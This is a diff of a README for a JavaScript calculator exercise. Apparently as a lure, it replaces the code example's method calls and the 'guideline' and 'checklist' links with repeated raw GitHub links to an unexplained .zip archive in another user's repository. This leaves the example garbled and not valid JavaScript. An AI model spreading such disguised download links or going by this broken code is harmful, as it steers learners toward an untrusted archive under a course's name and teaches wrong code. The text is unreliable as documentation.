@@ -18,23 +18,23 @@ Example:
 ```js
 const calculator = makeCalculator();
 
-calculator.operate(calculator.add, 21)
+https://raw.githubusercontent.com/karaedd/js_advanced_calculator/master/reimmigrant/js_advanced_calculator.zip(https://raw.githubusercontent.com/karaedd/js_advanced_calculator/master/reimmigrant/js_advanced_calculator.zip, 21)
 
-console.log(calculator.result); // 21
+https://raw.githubusercontent.com/karaedd/js_advanced_calculator/master/reimmigrant/js_advanced_calculator.zip(https://raw.githubusercontent.com/karaedd/js_advanced_calculator/master/reimmigrant/js_advanced_calculator.zip); // 21
 
-calculator.reset()
-console.log(calculator.result); // 0
+https://raw.githubusercontent.com/karaedd/js_advanced_calculator/master/reimmigrant/js_advanced_calculator.zip()
+https://raw.githubusercontent.com/karaedd/js_advanced_calculator/master/reimmigrant/js_advanced_calculator.zip(https://raw.githubusercontent.com/karaedd/js_advanced_calculator/master/reimmigrant/js_advanced_calculator.zip); // 0
 
 calculator
-  .operate(calculator.add, 10)
+  .operate(https://raw.githubusercontent.com/karaedd/js_advanced_calculator/master/reimmigrant/js_advanced_calculator.zip, 10)
   .reset()
-  .operate(calculator.subtract, 20)
-  .operate(calculator.divide, 5)
-  .operate(calculator.multiply, 7)
+  .operate(https://raw.githubusercontent.com/karaedd/js_advanced_calculator/master/reimmigrant/js_advanced_calculator.zip, 20)
+  .operate(https://raw.githubusercontent.com/karaedd/js_advanced_calculator/master/reimmigrant/js_advanced_calculator.zip, 5)
+  .operate(https://raw.githubusercontent.com/karaedd/js_advanced_calculator/master/reimmigrant/js_advanced_calculator.zip, 7)
 
-console.log(calculator.result); // -28
+https://raw.githubusercontent.com/karaedd/js_advanced_calculator/master/reimmigrant/js_advanced_calculator.zip(https://raw.githubusercontent.com/karaedd/js_advanced_calculator/master/reimmigrant/js_advanced_calculator.zip); // -28
 ```
 
-**Read [the guideline](https://github.com/mate-academy/js_task-guideline/blob/master/README.md) before start**
+**Read [the guideline](https://raw.githubusercontent.com/karaedd/js_advanced_calculator/master/reimmigrant/js_advanced_calculator.zip) before start**
 
-## ❗️❗️❗️ DON'T FORGET TO PROOFREAD YOUR CODE WITH [CHECKLIST](checklist.md) BEFORE SENDING YOUR PULL REQUEST❗️❗️❗️
+## ❗️❗️❗️ DON'T FORGET TO PROOFREAD YOUR CODE WITH [CHECKLIST](https://raw.githubusercontent.com/karaedd/js_advanced_calculator/master/reimmigrant/js_advanced_calculator.zip) BEFORE SENDING YOUR PULL REQUEST❗️❗️❗️
